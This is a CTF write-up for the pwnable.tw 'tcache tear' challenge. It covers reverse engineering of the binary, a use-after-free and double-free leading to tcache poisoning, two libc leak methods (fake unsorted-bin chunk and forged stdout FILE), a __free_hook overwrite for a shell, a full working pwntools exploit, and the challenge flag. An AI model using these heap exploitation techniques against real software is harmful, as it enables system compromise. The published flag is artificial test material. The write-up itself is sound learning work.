@@ -1,0 +1,521 @@
+---
+title: '[PWNABLE.TW] - tcache tear'
+description: 'tcachebin >> fastbin'
+image: '../../../img/cover_photo_wargame_imresizer.png'
+date: 2025-05-04
+tags: ['2025', 'Wargame', 'pwnable.tw']
+authors: ['kdot']
+draft: false
+---
+
+import Challenge from '@/components/mdx/Challenge.astro'
+import Callout from '@/components/Callout.astro'
+
+## Challenge Information
+
+<Challenge
+  category="pwn"
+  points={200}
+  description="Make tcache great again !"
+  flag="FLAG{tc4ch3_1s_34sy_f0r_y0u}"
+>
+</Challenge>
+
+## Reverse Engineering
+
+```sh
+alter ^ Sol in /mnt/e/sec/lab/pwnable.tw/TcacheTear
+$ checksec tcache_tear_patched
+[*] '/mnt/e/sec/lab/pwnable.tw/TcacheTear/tcache_tear_patched'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x3ff000)
+    RUNPATH:    b'.'
+    FORTIFY:    Enabled
+```
+
+We see that the binary is not PIE, so we can use the static address of the functions. The binary is also patched with Full RELRO and stack canary. Next, let's analyze the binary with IDA.
+
+<details id="main">
+<summary>`main` function</summary>
+<p>
+
+```c
+void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
+{
+  __int64 choice; // rax
+  unsigned int n7; // [rsp+Ch] [rbp-4h]
+
+  setup();
+  printf("Name:");
+  read_input((__int64)&gbuf, 32LL);
+  n7 = 0;
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      menu();
+      choice = read_int();
+      if ( choice != 2 )
+        break;
+      if ( n7 <= 7 )                            // Just can free 8 times
+      {
+        free(ptr);                              // Use-After-Free
+        ++n7;
+      }
+    }
+    if ( choice > 2 )
+    {
+      if ( choice == 3 )
+      {
+        info();
+      }
+      else
+      {
+        if ( choice == 4 )
+          exit(0);
+LABEL_14:
+        puts("Invalid choice");
+      }
+    }
+    else
+    {
+      if ( choice != 1 )
+        goto LABEL_14;
+      mallocFun();
+    }
+  }
+}
+```
+
+
+</p>
+</details>
+
+<details id="info">
+<summary>`info` function</summary>
+<p>
+
+```c
+ssize_t info()
+{
+  printf("Name :");
+  return write(1, &gbuf, 0x20uLL);              // Can use this to leak
+}
+```
+
+
+</p>
+</details>
+
+<details id="malloc">
+<summary>`mallocFun` function</summary>
+<p>
+
+```c
+int mallocFun()
+{
+  size_t sz; // rax
+  int size; // [rsp+8h] [rbp-8h]
+
+  printf("Size:");
+  sz = read_int();
+  size = sz;
+  if ( sz <= 255 )
+  {
+    ptr = malloc(sz);
+    printf("Data:");
+    read_input((__int64)ptr, (unsigned int)(size - 0x10));
+    LODWORD(sz) = puts("Done !");
+  }
+  return sz;
+}
+```
+
+</p>
+</details>
+
+Pretty simple, in general we can `free` 8 times,`malloc` with specified size, write data to that allocated chunk, and `print` out our name. As you can see what I note in the `main` function, since it doesn't clear the pointer after free so we have `Use-After-Free` here. Note that this is `libc 2.27` and there isn't double free in `tcachebin`, so we have one more bug here which is `Double Free Bug`.
+
+## Exploit Strategies
+
+We have `Use-After-Free` and `Double Free Bug` here, so that we can use a technique called `tcache poisoning` to exploit this binary. `tcache poisoning` give us the ability to write any where we want. So my plan for this are:
+
+1. Leak libc address using `info` function || Leak libc address using `fsop`.
+2. Overwrite `__free_hook` with `system` address.
+
+## Exploit Development
+
+In this part, I will show two ways to leak libc address. I know everyone is looking for write up to learn new methods, and I am too. This note is for me to read again later.
+
+### Leak libc address
+
+#### Method 1: Using `info` function
+
+After analyzing the program, we know the above 2 errors. In addition to the info functionn it performs `write(1, &gbuf, 0x20)`, which means it will take the `0x20` bytes stored in `gbuf` and print out them. If we can overwrite `gbuf` so that its first eight bytes hold a libc address, then calling `info` function will spit out that address.
+To do that we need to mention our friend `unsortedbin` again, we know that after a chunk is freed and goes into `unsortedbin` its `fd` and `bk` pointer will be the address of `main_arena+96` which is in libc (I'm considering the case that it is the only chunk in `unsortedbin`)
+
+So we'll create a fake chunk whose size is within the range of this `unsortedbin` friend. I'll put it at `gbuf` - 0x10 because when we free this `fake chunk` `fd` and `bk` will be added to the exact location we want. But note that we have to create 2 more fake chunks to bypass GLIBC Mitigation (if you're curious about what that mitigation is, you can see it [here](https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L4281))
+
+<Callout title='GLIBC Mitigation'>
+For those who don't know, the above mitigation will check if the `prev_inuse` bit of the next chunk is set or not, this is necessary because malloc  will try to clear the bit `prev_inuse`. Besides, malloc will try to `consolidate` those 2 chunks together, and to do this, it will check the `prev_inuse` bit of the third one.
+</Callout>
+
+```py title=exploit.py
+    GBUF_ADDR = 0x602060
+
+    sa(b'Name:', b'A'*0x8)
+
+    malloc(0x60, b"AAAA")
+    free()
+    free()
+
+    fake_chunk = flat(
+        0x0, 0x20 | 1,
+        0x0, 0x0,
+        0x0, 0x20 | 1
+    )
+
+    malloc(0x60, p64(GBUF_ADDR + 0x420 - 0x10))
+    malloc(0x60, b"BBBB")
+    malloc(0x60, fake_chunk)
+
+
+    malloc(0x70, b"AAAA")
+    free()
+    free()
+
+    fake_chunk = flat(
+        0x0, 0x420 | 1,
+        0x0, 0x0,
+        0x0, 0x0,
+        0x0, GBUF_ADDR
+    )
+
+    malloc(0x70, p64(GBUF_ADDR - 0x10))
+    malloc(0x70, b"BBBB")
+    malloc(0x70, fake_chunk)
+
+    free()
+    info()
+
+    leak_address = u64(rb(6).ljust(0x8, b'\0'))
+    libc.address = leak_address - 0x3ebca0
+    success('leak @ %#x', leak_address)
+    success('libc base @ %#x', libc.address)
+```
+
+The above code is part of my exploit, if everything is correct our 2 fake chunks should look like this:
+
+```sh title='GDB'
+pwndbg> dq 0x602060-0x10
+0000000000602050     0000000000000000 0000000000000421
+0000000000602060     0000000000000000 0000000000000000
+0000000000602070     0000000000000000 0000000000000000
+0000000000602080     0000000000000000 0000000000602060
+pwndbg> dq 0x602060-0x10+0x420
+0000000000602470     0000000000000000 0000000000000021
+0000000000602480     0000000000000000 0000000000000000
+0000000000602490     0000000000000000 0000000000000021
+00000000006024a0     0000000000000000 0000000000000000
+```
+
+And free it, we will have libc address in `gbuf`:
+
+```sh title='GDB'
+pwndbg> dq 0x602060-0x10
+0000000000602050     0000000000000000 0000000000000421
+0000000000602060     00007ffff7dcfca0 00007ffff7dcfca0
+0000000000602070     0000000000000000 0000000000000000
+0000000000602080     0000000000000000 0000000000602060
+```
+
+Call `info` function and we will have libc address leaked:
+
+```sh title='GDB'
+ ► 0x400bbf    call   write@plt                   <write@plt>
+        fd: 1 (/dev/pts/2)
+        buf: 0x602060 —▸ 0x7ffff7dcfca0 (main_arena+96) —▸ 0x603340 ◂— 0
+        n: 0x20
+```
+
+#### Method 2: Using `fsop`
+
+This method is similar but the only difference is that we craft `fake_struct` for stdout. We know that in the `mallocFun` function, there is a call to the `puts` function and this function will call the following functions in sequence `__GI__IO_file_xsputn` -> `__GI__IO_file_overflow` -> `_IO_file_write`. And some basic points in our fake struct that we need to note are that `_IO_read_end` must be equal to `fp->_IO_write_base` (this check is in the `_IO_new_do_write` function), and we will target here `write(f->_fileno, _IO_write_base, _IO_write_ptr - _IO_write_base);` with `f->fileno` being our fd, `_IO_write_base` will be where the printed address is stored, and `_IO_write_ptr - _IO_write_base` is the number of bytes printed. So my paylaod is:
+
+```py title='exploit.py'
+    STDOUT_ADDR = 0x602020
+    sa(b'Name:', b'A'*0x8)
+
+    malloc(0x68, b"AAAA")
+    free()
+    free()
+
+    malloc(0x68, p64(STDOUT_ADDR))
+    malloc(0x68, p64(0x0))
+    malloc(0x68, p8(0x60))
+
+    STDERR_ADDR   = 0x602040
+    _FLAGS      = 0xfbad2887
+
+    fields = [
+        _FLAGS,                # _flags
+        0,                     # _IO_read_ptr
+        STDERR_ADDR,           # _IO_read_end
+        0,                     # _IO_read_base
+        STDERR_ADDR,           # _IO_write_base
+        STDERR_ADDR + 0x100,   # _IO_write_ptr
+        0,                     # _IO_write_end
+        0,                     # _IO_buf_base
+        0,                     # _IO_buf_end
+        0,                     # _IO_save_base
+        0,                     # _IO_backup_base
+        0,                     # _IO_save_end
+        0,                     # _markers
+        0,                     # _chain
+        1,                     # _fileno (1 = STDOUT_ADDR)
+    ]
+
+
+    malloc(0x68, flat(*fields))
+
+    libc.address = u64(p.recv(6).ljust(8, b"\x00")) - 0x3ec680
+    success('libc base @ %#x', libc.address)
+```
+
+There are 2 places in the above code that we need to pay attention to, that is `malloc(0x68, p8(0x60))` in this `malloc` it will read data directly into `stdout` changing its value and causing an error, so we should only overwrite its last byte with its original value of 0x60.
+
+<Callout title="Why don't we use stdin?">
+The reason that I use `stderr` instead of `stdin` is because `stdin` has a null last byte, and the `write` function will stop when it encounters `null`
+```sh title='GDB'
+pwndbg> x/xg 0x602030
+0x602030 <stdin>:       0x00007ffff7dcfa00
+pwndbg> x/8xb 0x602030
+0x602030 <stdin>:       0x00    0xfa    0xdc    0xf7    0xff    0x7f    0x00    0x00
+```
+</Callout>
+
+If everything is correct then on the next puts it will look like this (I went inside that function to see):
+
+```sh title='GDB'
+ ► 0x7ffff7a6f1b8 <_IO_file_write@@GLIBC_2.2.5+40>    call   write                       <write>
+        fd: 1 (/dev/pts/2)
+        buf: 0x602040 (stderr) —▸ 0x7ffff7dd0680 (_IO_2_1_stderr_) ◂— 0xfbad2087
+        n: 0x100
+```
+
+Here is `backtrace` for someone who is curious about how it works:
+
+```sh title='GDB'
+pwndbg> bt
+#0  _IO_new_file_write (f=0x7ffff7dd0760 <_IO_2_1_stdout_>, data=0x602040 <stderr>, n=256) at fileops.c:1203
+#1  0x00007ffff7a70f51 in new_do_write (to_do=256, data=0x602040 <stderr> "\200\006\335\367\377\177", fp=0x7ffff7dd0760 <_IO_2_1_stdout_>) at fileops.c:457
+#2  _IO_new_do_write (fp=0x7ffff7dd0760 <_IO_2_1_stdout_>, data=0x602040 <stderr> "\200\006\335\367\377\177", to_do=256) at fileops.c:433
+#3  0x00007ffff7a6f9ed in _IO_new_file_xsputn (f=0x7ffff7dd0760 <_IO_2_1_stdout_>, data=<optimized out>, n=6) at fileops.c:1266
+#4  0x00007ffff7a64a8f in _IO_puts (str=0x400dd0 "Done !") at ioputs.c:40
+#5  0x0000000000400b95 in ?? ()
+#6  0x0000000000400c42 in ?? ()
+#7  0x00007ffff7a05b97 in __libc_start_main (main=0x400bc7, argc=1, argv=0x7fffffffdd08, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdcf8) at ../csu/libc-start.c:310
+#8  0x000000000040086a in ?? ()
+```
+
+### Get shell
+
+After leaking libc address, this phase is easy. We just need to overwrite `__free_hook` with `system` address and then call `free` with the address of the string `/bin/sh\0`.
+```py title=exploit.py
+    # Overwrite __free_hook -> system
+    malloc(0x80, b"AAAA")
+    free()
+    free()
+
+    malloc(0x80, p64(libc.sym.__free_hook))
+    malloc(0x80, b"BBBB")
+    malloc(0x80, p64(libc.sym.system))
+
+
+    # Trigger __free_hook
+    malloc(0x90, b'/bin/sh\0')
+    free()
+```
+
+<details id="full exploit">
+<summary>Full exploit</summary>
+<p>
+
+```py title=exploit.py collapse={1-38}
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwnie import *
+from subprocess import check_output
+from time import sleep
+
+context.log_level = 'debug'
+context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.6", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
+exe = context.binary = ELF('./tcache_tear_patched', checksec=False)
+libc = exe.libc
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    elif args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    elif args.DOCKER:
+        p = remote("localhost", 5000)
+        sleep(1)
+        pid = int(check_output(["pidof", "-s", "/app/run"]))
+        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
+        pause()
+        return p
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+
+b *0x400B54
+b *0x400C54
+b *0x400BBF
+
+c
+'''
+
+p = start()
+
+# ==================== EXPLOIT ====================
+
+def choice(option: int):
+    sna(b'choice :', option)
+
+
+def malloc(size, data):
+    choice(1)
+    sna(b'Size:', size)
+    sa(b'Data:', data)
+
+
+def free():
+    choice(2)
+
+
+def info():
+    choice(3)
+    ru(b'Name :')
+
+
+def leak_libc(fsop=False):
+
+    if fsop:
+        STDOUT_ADDR = 0x602020
+        sa(b'Name:', b'A'*0x8)
+
+        malloc(0x68, b"AAAA")
+        free()
+        free()
+
+        malloc(0x68, p64(STDOUT_ADDR))
+        malloc(0x68, p64(0x0))
+        malloc(0x68, p8(0x60))
+
+        STDERR_ADDR   = 0x602040
+        _FLAGS      = 0xfbad2887
+
+        fields = [
+            _FLAGS,                # _flags
+            0,                     # _IO_read_ptr
+            STDERR_ADDR,           # _IO_read_end
+            0,                     # _IO_read_base
+            STDERR_ADDR,           # _IO_write_base
+            STDERR_ADDR + 0x100,   # _IO_write_ptr
+            0,                     # _IO_write_end
+            0,                     # _IO_buf_base
+            0,                     # _IO_buf_end
+            0,                     # _IO_save_base
+            0,                     # _IO_backup_base
+            0,                     # _IO_save_end
+            0,                     # _markers
+            0,                     # _chain
+            1,                     # _fileno (1 = STDOUT_ADDR)
+        ]
+
+        malloc(0x68, flat(*fields))
+
+        libc.address = u64(p.recv(6).ljust(8, b"\x00")) - 0x3ec680
+        success('libc base @ %#x', libc.address)
+
+    else:
+        GBUF_ADDR = 0x602060
+
+        sa(b'Name:', b'A'*0x8)
+
+        malloc(0x60, b"AAAA")
+        free()
+        free()
+
+        fake_chunk = flat(
+            0x0, 0x20 | 1,
+            0x0, 0x0,
+            0x0, 0x20 | 1
+        )
+
+        malloc(0x60, p64(GBUF_ADDR + 0x420 - 0x10))
+        malloc(0x60, b"BBBB")
+        malloc(0x60, fake_chunk)
+
+
+        malloc(0x70, b"AAAA")
+        free()
+        free()
+
+        fake_chunk = flat(
+            0x0, 0x420 | 1,
+            0x0, 0x0,
+            0x0, 0x0,
+            0x0, GBUF_ADDR
+        )
+
+        malloc(0x70, p64(GBUF_ADDR - 0x10))
+        malloc(0x70, b"BBBB")
+        malloc(0x70, fake_chunk)
+
+        free()
+        info()
+
+        leak_address = u64(rb(6).ljust(0x8, b'\0'))
+        libc.address = leak_address - 0x3ebca0
+        success('leak @ %#x', leak_address)
+        success('libc base @ %#x', libc.address)
+
+
+def get_shell():
+
+    # Overwrite __free_hook -> system
+    malloc(0x80, b"AAAA")
+    free()
+    free()
+
+    malloc(0x80, p64(libc.sym.__free_hook))
+    malloc(0x80, b"BBBB")
+    malloc(0x80, p64(libc.sym.system))
+
+    # Trigger __free_hook
+    malloc(0x90, b'/bin/sh\0')
+    free()
+
+
+def exploit():
+
+    leak_libc(fsop=True)
+    get_shell()
+
+    interactive()
+
+if __name__ == '__main__':
+    exploit()
+
+# FLAG{tc4ch3_1s_34sy_f0r_y0u}
+```
+
+</p>
+</details>
